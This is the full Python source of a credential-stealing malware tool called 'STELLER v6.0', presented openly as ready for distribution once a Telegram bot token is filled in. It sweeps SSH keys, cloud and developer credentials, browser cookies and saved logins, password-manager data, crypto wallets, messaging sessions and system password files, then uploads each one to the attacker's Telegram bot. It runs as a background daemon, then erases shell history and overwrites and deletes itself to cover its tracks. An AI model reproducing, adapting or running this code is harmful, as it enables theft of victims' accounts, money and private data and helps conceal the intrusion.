#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# STELLER v6.0 - Autonomous exfiltrator with self-destruct
# EDIT BOT_TOKEN BELOW BEFORE DISTRIBUTION

import os
import sys
import time
import json
import sqlite3
import shutil
import subprocess
import threading
import socket
import base64
import hashlib
import secrets
import glob
import zipfile
import io
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import platform
import getpass

# ===== EDIT THIS =====
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Format: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
# =====================

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
SEND_MSG = f"{TELEGRAM_API}/sendMessage"
SEND_DOC = f"{TELEGRAM_API}/sendDocument"

# ===== TARGET DEFINITIONS =====
TARGETS = {
    # Telegram Desktop sessions
    "telegram": [
        "~/.local/share/TelegramDesktop/tdata/*",
        "~/AppData/Roaming/Telegram Desktop/tdata/*",
        "~/.TelegramDesktop/tdata/*"
    ],
    
    # Roblox
    "roblox": [
        "~/.local/share/Roblox/*",
        "~/AppData/Local/Roblox/*",
        "~/Library/Application Support/Roblox/*",
        "~/.config/roblox/*"
    ],
    
    # FunPay
    "funpay": [
        "~/.funpay/*",
        "~/AppData/Roaming/FunPay/*",
        "~/.config/funpay/*"
    ],
    
    # Email clients
    "emails": [
        "~/.thunderbird/*.default-release/*",
        "~/.thunderbird/*.default/*",
        "~/AppData/Roaming/Thunderbird/Profiles/*/*",
        "~/.local/share/evolution/*",
        "~/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "~/.mozilla/firefox/*.default-release/cookies.sqlite",
        "~/.config/opera/Default/Cookies",
        "~/.config/BraveSoftware/Brave-Browser/Default/Cookies"
    ],
    
    # Minecraft
    "minecraft": [
        "~/.minecraft/logs/*.log",
        "~/.minecraft/launcher_log.txt",
        "~/.minecraft/servers.dat",
        "~/.minecraft/options.txt",
        "~/AppData/Roaming/.minecraft/logs/*",
        "~/Library/Application Support/minecraft/logs/*"
    ],
    
    # Authentication files
    "auth": [
        "~/.ssh/id_rsa",
        "~/.ssh/id_dsa",
        "~/.ssh/id_ecdsa",
        "~/.ssh/id_ed25519",
        "~/.ssh/known_hosts",
        "~/.aws/credentials",
        "~/.aws/config",
        "~/.config/gcloud/credentials.db",
        "~/.config/gcloud/access_tokens.db",
        "~/.docker/config.json",
        "~/AppData/Roaming/docker/config.json"
    ],
    
    # Session cookies (various browsers)
    "cookies": [
        "~/.config/chromium/Default/Cookies",
        "~/.config/google-chrome/Default/Cookies",
        "~/.config/chrome/Default/Cookies",
        "~/.config/firefox/*.default/cookies.sqlite",
        "~/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "~/AppData/Roaming/Mozilla/Firefox/Profiles/*/cookies.sqlite",
        "~/Library/Application Support/Google/Chrome/Default/Cookies",
        "~/Library/Application Support/Firefox/Profiles/*/cookies.sqlite"
    ],
    
    # Password managers
    "passwords": [
        "~/.config/Bitwarden/data.json",
        "~/.local/share/keyrings/*",
        "~/AppData/Roaming/KeyPass/*",
        "~/Library/Application Support/1Password/*"
    ],
    
    # Discord
    "discord": [
        "~/.config/discord/Local Storage/*",
        "~/.config/discord/IndexedDB/*",
        "~/AppData/Roaming/discord/Local Storage/*",
        "~/Library/Application Support/discord/Local Storage/*"
    ],
    
    # Steam
    "steam": [
        "~/.steam/steam/config/loginusers.vdf",
        "~/.steam/steam/config/config.vdf",
        "~/AppData/Local/Steam/config/*",
        "~/Library/Application Support/Steam/config/*"
    ],
    
    # Epic Games
    "epic": [
        "~/.config/Epic/Launcher/*",
        "~/AppData/Local/Epic Games/Launcher/*",
        "~/Library/Application Support/Epic Games/*"
    ],
    
    # System files
    "system": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/ssh/ssh_host_rsa_key",
        "/etc/ssh/ssh_host_ecdsa_key",
        "/root/.bash_history",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/secure",
        "~/.bash_history",
        "~/.zsh_history",
        "~/.profile",
        "~/.bashrc",
        "~/.ssh/authorized_keys",
        "~/.pgpass",
        "~/.my.cnf"
    ],
    
    # Development
    "dev": [
        "~/.git-credentials",
        "~/.gitconfig",
        "~/.npmrc",
        "~/.pypirc",
        "~/.composer/auth.json",
        "~/.config/gh/hosts.yml",
        "~/.config/gh/config.yml",
        "~/.config/pip/pip.conf",
        "~/.m2/settings.xml",
        "~/.docker/config.json",
        "~/.kube/config"
    ],
    
    # Windows specific
    "windows": [
        "C:/Users/*/AppData/Roaming/Microsoft/Windows/Cookies/*",
        "C:/Users/*/AppData/Local/Microsoft/Windows/INetCookies/*",
        "C:/Windows/System32/config/SAM",
        "C:/Windows/System32/config/SYSTEM",
        "C:/Windows/System32/config/SECURITY"
    ],
    
    # MacOS specific
    "macos": [
        "/Library/Keychains/*",
        "~/Library/Keychains/*",
        "~/Library/Cookies/*",
        "~/Library/Application Support/iCloud/*",
        "~/Library/Messages/chat.db"
    ],
    
    # Cryptocurrency wallets
    "crypto": [
        "~/.bitcoin/wallet.dat",
        "~/.ethereum/keystore/*",
        "~/.monero/wallet/*",
        "~/.zcash/wallet.dat",
        "~/.dogecoin/wallet.dat",
        "~/.litecoin/wallet.dat",
        "~/AppData/Roaming/Bitcoin/wallet.dat",
        "~/Library/Application Support/Bitcoin/wallet.dat"
    ],
    
    # VPN
    "vpn": [
        "~/.openvpn/*.ovpn",
        "~/.config/wireguard/*.conf",
        "~/.config/tunnelblick/*",
        "~/AppData/Roaming/OpenVPN/*"
    ],
    
    # Gaming platforms
    "gaming": [
        "~/.config/Riot Games/*",
        "~/.config/Ubisoft/*",
        "~/.config/Battlenet/*",
        "~/AppData/Roaming/Battle.net/*",
        "~/AppData/Roaming/Ubisoft/*",
        "~/AppData/Roaming/Riot Games/*",
        "~/Library/Application Support/Riot Games/*"
    ],
    
    # Social media (cookies/sessions)
    "social": [
        "~/.config/WhatsApp/*",
        "~/.config/Telegram/*",
        "~/.config/Signal/*",
        "~/AppData/Roaming/WhatsApp/*",
        "~/Library/Application Support/WhatsApp/*"
    ],
    
    # Cloud storage
    "cloud": [
        "~/.config/dropbox/*",
        "~/.config/google-drive/*",
        "~/.config/onedrive/*",
        "~/AppData/Roaming/Dropbox/*",
        "~/AppData/Roaming/OneDrive/*",
        "~/Library/Application Support/Dropbox/*"
    ],
    
    # Databases
    "databases": [
        "~/.sqlite_history",
        "~/.mysql_history",
        "~/.psql_history",
        "~/.mongorc.js",
        "~/.rediscli_history"
    ],
    
    # Network
    "network": [
        "/etc/NetworkManager/system-connections/*",
        "/etc/wpa_supplicant/wpa_supplicant.conf",
        "~/Library/Preferences/com.apple.airport.interface.plist",
        "C:/ProgramData/rasphone.pbk"
    ],
    
    # Source code repositories
    "repos": [
        "~/.git/hooks/*",
        "~/.git/config",
        "~/.svn/auth/*",
        "~/.hg/hgrc"
    ]
}

# ===== UTILITY FUNCTIONS =====

def get_pc_name() -> str:
    """Get computer name"""
    return socket.gethostname()

def get_os_info() -> str:
    """Get OS information"""
    try:
        return f"{platform.system()} {platform.release()} ({platform.machine()})"
    except:
        return "Unknown OS"

def get_username() -> str:
    """Get current username"""
    try:
        return getpass.getuser()
    except:
        return os.environ.get('USER', 'unknown')

def get_ip() -> str:
    """Get external IP"""
    try:
        return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'

def send_message(text: str) -> bool:
    """Send message to Telegram"""
    try:
        data = urllib.parse.urlencode({'text': text}).encode()
        req = urllib.request.Request(SEND_MSG, data=data, method='POST')
        urllib.request.urlopen(req, timeout=10)
        return True
    except:
        return False

def send_file(filepath: str, filename: str = None) -> bool:
    """Send file to Telegram"""
    try:
        if not filename:
            filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        boundary = '----' + secrets.token_hex(16)
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
            f'Content-Type: application/octet-stream\r\n\r\n'
        ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Content-Length': str(len(body))
        }
        
        req = urllib.request.Request(SEND_DOC, data=body, headers=headers, method='POST')
        urllib.request.urlopen(req, timeout=30)
        return True
    except:
        return False

def safe_read_file(filepath: str, max_size: int = 50*1024*1024) -> Optional[bytes]:
    """Safely read file with size limit"""
    try:
        if os.path.islink(filepath):
            return None
        size = os.path.getsize(filepath)
        if size > max_size:
            return None
        with open(filepath, 'rb') as f:
            return f.read()
    except:
        return None

def expand_path(pattern: str) -> List[Path]:
    """Expand glob pattern with user path"""
    try:
        pattern = os.path.expanduser(pattern)
        results = []
        for path in glob.glob(pattern, recursive=True):
            if os.path.isfile(path) and not os.path.islink(path):
                results.append(Path(path))
        return results
    except:
        return []

# ===== TARGET COLLECTORS =====

def collect_telegram_sessions() -> Dict[str, List[str]]:
    """Collect Telegram session files and data"""
    files = []
    patterns = [
        "~/.local/share/TelegramDesktop/tdata/*.dat",
        "~/.local/share/TelegramDesktop/tdata/D*",
        "~/.local/share/TelegramDesktop/tdata/usertag",
        "~/AppData/Roaming/Telegram Desktop/tdata/*.dat",
        "~/AppData/Roaming/Telegram Desktop/tdata/D*",
        "~/.TelegramDesktop/tdata/*.dat",
        "~/Library/Application Support/Telegram Desktop/tdata/*.dat"
    ]
    
    for pattern in patterns:
        try:
            files.extend(expand_path(pattern))
        except:
            pass
    
    return {"telegram_sessions": [str(f) for f in files if f.exists()]}

def collect_roblox() -> Dict[str, List[str]]:
    """Collect Roblox credentials and data"""
    files = []
    patterns = [
        "~/.local/share/Roblox/*.json",
        "~/.local/share/Roblox/*.db",
        "~/AppData/Local/Roblox/*.json",
        "~/AppData/Local/Roblox/*.db",
        "~/Library/Application Support/Roblox/*.json",
        "~/.config/roblox/*.json",
        # Cookies for Roblox
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox/*.default/cookies.sqlite",
        "~/AppData/Local/Google/Chrome/User Data/Default/Cookies"
    ]
    
    for pattern in patterns:
        try:
            files.extend(expand_path(pattern))
        except:
            pass
    
    return {"roblox": [str(f) for f in files if f.exists()]}

def collect_funpay() -> Dict[str, List[str]]:
    """Collect FunPay tokens and data"""
    files = []
    patterns = [
        "~/.funpay/*.json",
        "~/.funpay/*.db",
        "~/AppData/Roaming/FunPay/*.json",
        "~/.config/funpay/*.json",
        "~/.config/funpay/*.db",
        # FunPay cookies
        "~/.config/chromium/Default/Cookies",
        "~/.config/google-chrome/Default/Cookies"
    ]
    
    for pattern in patterns:
        try:
            files.extend(expand_path(pattern))
        except:
            pass
    
    return {"funpay": [str(f) for f in files if f.exists()]}

def collect_emails() -> Dict[str, List[str]]:
    """Collect email client data and credentials"""
    files = []
    patterns = [
        "~/.thunderbird/*.default-release/*.sqlite",
        "~/.thunderbird/*.default/*.sqlite",
        "~/.thunderbird/*.default/prefs.js",
        "~/.thunderbird/*.default-release/prefs.js",
        "~/AppData/Roaming/Thunderbird/Profiles/*/*.sqlite",
        "~/.local/share/evolution/*/*.db",
        "~/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "~/.mozilla/firefox/*.default-release/cookies.sqlite",
        "~/.config/opera/Default/Cookies",
        "~/.config/BraveSoftware/Brave-Browser/Default/Cookies",
        "~/.config/google-chrome/Default/Login Data",
        "~/.config/google-chrome/Default/Web Data",
        "~/AppData/Local/Google/Chrome/User Data/Default/Login Data",
        "~/AppData/Local/Google/Chrome/User Data/Default/Web Data",
        # Outlook data
        "~/AppData/Roaming/Microsoft/Outlook/*.pst",
        "~/AppData/Local/Microsoft/Outlook/*.ost",
        "~/Library/Application Support/Microsoft/Outlook/*.olm"
    ]
    
    for pattern in patterns:
        try:
            files.extend(expand_path(pattern))
        except:
            pass
    
    return {"emails": [str(f) for f in files if f.exists()]}

def collect_minecraft() -> Dict[str, List[str]]:
    """Collect Minecraft logs and auth data"""
    files = []
    patterns = [
        "~/.minecraft/logs/*.log",
        "~/.minecraft/launcher_log.txt",
        "~/.minecraft/servers.dat",
        "~/.minecraft/options.txt",
        "~/.minecraft/config/*.json",
        "~/AppData/Roaming/.minecraft/logs/*",
        "~/AppData/Roaming/.minecraft/launcher_log.txt",
        "~/Library/Application Support/minecraft/logs/*",
        "~/Library/Application Support/minecraft/launcher_log.txt",
        # Minecraft cookies/sessions (if in browser)
        "~/.config/google-chrome/Default/Cookies",
        "~/.mozilla/firefox/*.default/cookies.sqlite"
    ]
    
    for pattern in patterns:
        try:
            files.extend(expand_path(pattern))
        except:
            pass
    
    return {"minecraft": [str(f) for f in files if f.exists()]}

def collect_all_targets() -> Dict[str, List[str]]:
    """Collect ALL targets using the TARGETS dictionary"""
    all_files = {}
    
    for category, patterns in TARGETS.items():
        category_files = []
        for pattern in patterns:
            try:
                expanded = expand_path(pattern)
                category_files.extend([str(f) for f in expanded if f.exists()])
            except:
                pass
        if category_files:
            all_files[category] = category_files
    
    return all_files

def collect_active_windows() -> Dict[str, str]:
    """Collect active window titles"""
    windows = {}
    try:
        if platform.system() == "Windows":
            import win32gui, win32process, psutil
            def enum_windows(hwnd, result):
                if win32gui.IsWindowVisible(hwnd):
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
                        try:
                            proc = psutil.Process(pid)
                            name = proc.name()
                        except:
                            name = "Unknown"
                        windows[title] = name
            win32gui.EnumWindows(enum_windows, None)
        else:
            # Linux/Mac - use xdotool or wmctrl
            try:
                result = subprocess.run(['wmctrl', '-l'], capture_output=True, text=True, timeout=2)
                for line in result.stdout.split('\n'):
                    if line.strip():
                        parts = line.split(None, 3)
                        if len(parts) >= 4:
                            windows[parts[3]] = parts[2]  # title -> desktop
            except:
                try:
                    result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                          capture_output=True, text=True, timeout=1)
                    if result.stdout.strip():
                        windows['active'] = result.stdout.strip()
                except:
                    pass
    except:
        pass
    return windows

def collect_network_connections() -> List[Dict]:
    """Collect active network connections"""
    connections = []
    try:
        import psutil
        for conn in psutil.net_connections(kind='all'):
            if conn.status == 'ESTABLISHED':
                connections.append({
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else '',
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else '',
                    'status': conn.status,
                    'pid': conn.pid
                })
    except:
        pass
    return connections[:50]  # Limit to 50 connections

def collect_running_processes() -> List[Dict]:
    """Collect running processes list"""
    processes = []
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = proc.info
                processes.append(info)
            except:
                pass
    except:
        pass
    return processes[:100]  # Limit to 100 processes

def collect_environment_variables() -> Dict[str, str]:
    """Collect environment variables"""
    env = {}
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'AUTH', 'CREDENTIAL']
    for key, value in os.environ.items():
        if any(s in key.upper() for s in sensitive_keys):
            env[key] = value[:50] + '...' if len(value) > 50 else value
    return env

# ===== MAIN EXFILTRATION ENGINE =====

class StellerEngine:
    def __init__(self):
        self.pc_name = get_pc_name()
        self.username = get_username()
        self.os_info = get_os_info()
        self.ip = get_ip()
        self.collected_files = []
        self.status = "Collecting..."
        self.success = True
        
    def send_start_notification(self):
        """Send startup notification to bot"""
        msg = (
            f"🔴 STELLER ACTIVATED\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💻 PC: {self.pc_name}\n"
            f"👤 User: {self.username}\n"
            f"🖥️ OS: {self.os_info}\n"
            f"🌐 IP: {self.ip}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Status: Collecting data..."
        )
        send_message(msg)
    
    def send_completion_notification(self, file_count: int):
        """Send completion notification with summary"""
        msg = (
            f"✅ STELLER COMPLETED\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"💻 PC: {self.pc_name}\n"
            f"👤 User: {self.username}\n"
            f"📁 Files collected: {file_count}\n"
            f"📤 Status: {'SUCCESS' if self.success else 'PARTIAL'}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ Self-destruct sequence initiated"
        )
        send_message(msg)
    
    def collect_and_send_file(self, filepath: str, category: str) -> bool:
        """Collect a single file and send it"""
        try:
            path = Path(filepath)
            if not path.exists() or path.is_dir():
                return False
            
            data = safe_read_file(filepath)
            if data is None:
                return False
            
            filename = f"{category}_{path.name}_{int(time.time())}.dat"
            
            # Create temp file
            temp_file = f"/tmp/{secrets.token_hex(8)}_{filename}"
            with open(temp_file, 'wb') as f:
                f.write(data)
            
            # Send file
            success = send_file(temp_file, filename)
            
            # Cleanup temp
            try:
                os.unlink(temp_file)
            except:
                pass
            
            return success
        except:
            return False
    
    def collect_all(self):
        """Main collection routine"""
        self.send_start_notification()
        
        total_files = 0
        successful_files = 0
        
        # 1. Collect specific targets
        print("[*] Collecting Telegram data...")
        tg_data = collect_telegram_sessions()
        for category, files in tg_data.items():
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        print("[*] Collecting Roblox data...")
        roblox_data = collect_roblox()
        for category, files in roblox_data.items():
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        print("[*] Collecting FunPay data...")
        funpay_data = collect_funpay()
        for category, files in funpay_data.items():
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        print("[*] Collecting Email data...")
        email_data = collect_emails()
        for category, files in email_data.items():
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        print("[*] Collecting Minecraft data...")
        mc_data = collect_minecraft()
        for category, files in mc_data.items():
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        # 2. Collect all targets from TARGETS dictionary
        print("[*] Collecting all 100+ targets...")
        all_data = collect_all_targets()
        for category, files in all_data.items():
            print(f"    - {category}: {len(files)} files")
            for filepath in files:
                if self.collect_and_send_file(filepath, category):
                    successful_files += 1
                total_files += 1
        
        # 3. Collect system information
        print("[*] Collecting system information...")
        system_info = {
            'pc_name': self.pc_name,
            'username': self.username,
            'os': self.os_info,
            'ip': self.ip,
            'time': datetime.now().isoformat(),
            'processes': collect_running_processes(),
            'network_connections': collect_network_connections(),
            'active_windows': collect_active_windows(),
            'environment': collect_environment_variables()
        }
        
        # Send system info as JSON
        try:
            info_json = json.dumps(system_info, indent=2, default=str)
            temp_file = f"/tmp/{secrets.token_hex(8)}_system_info.json"
            with open(temp_file, 'w') as f:
                f.write(info_json)
            send_file(temp_file, f"system_info_{self.pc_name}_{int(time.time())}.json")
            os.unlink(temp_file)
            successful_files += 1
            total_files += 1
        except:
            self.success = False
        
        # 4. Send summary
        self.status = f"Collected {successful_files}/{total_files} files"
        if successful_files < total_files:
            self.success = False
        
        self.send_completion_notification(successful_files)
    
    def self_destruct(self):
        """Completely remove all traces of this script"""
        print("[*] Starting self-destruct sequence...")
        
        try:
            # 1. Clear bash/zsh history
            history_files = [
                os.path.expanduser("~/.bash_history"),
                os.path.expanduser("~/.zsh_history"),
                os.path.expanduser("~/.history")
            ]
            for hfile in history_files:
                try:
                    if os.path.exists(hfile):
                        with open(hfile, 'w') as f:
                            f.write('')
                except:
                    pass
            
            # 2. Clear system logs (if possible)
            try:
                os.system('echo "" > ~/.bash_history && history -c 2>/dev/null')
                os.system('echo "" > ~/.zsh_history && history -c 2>/dev/null')
            except:
                pass
            
            # 3. Overwrite this script with random data
            try:
                script_path = os.path.abspath(__file__)
                if os.path.exists(script_path):
                    # Overwrite with random data multiple times
                    size = os.path.getsize(script_path)
                    for _ in range(3):  # 3 passes
                        with open(script_path, 'wb') as f:
                            f.write(secrets.token_bytes(size))
                        os.fsync(f.fileno())
                    
                    # Delete the file
                    os.unlink(script_path)
            except:
                pass
            
            # 4. Clear any temp files
            try:
                temp_dir = '/tmp'
                for item in os.listdir(temp_dir):
                    if 'steller' in item.lower() or 'piona' in item.lower():
                        try:
                            os.unlink(os.path.join(temp_dir, item))
                        except:
                            pass
            except:
                pass
            
            # 5. Clear Python cache
            try:
                import shutil
                for root, dirs, files in os.walk('/tmp'):
                    for d in dirs:
                        if '__pycache__' in d:
                            shutil.rmtree(os.path.join(root, d), ignore_errors=True)
            except:
                pass
            
            print("[+] Self-destruct complete")
            
        except Exception as e:
            print(f"[-] Self-destruct error: {e}")
            try:
                os.unlink(__file__)
            except:
                pass
    
    def run(self):
        """Main execution"""
        try:
            # Execute collection
            self.collect_all()
            
            # Brief pause to ensure all data is sent
            time.sleep(5)
            
            # Self-destruct
            self.self_destruct()
            
        except Exception as e:
            # Even on error, try to self-destruct
            try:
                self.self_destruct()
            except:
                pass
            sys.exit(1)

# ===== ENTRY POINT =====

if __name__ == "__main__":
    # Daemonize (double fork)
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    
    # Redirect output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    
    # Run
    engine = StellerEngine()
    engine.run()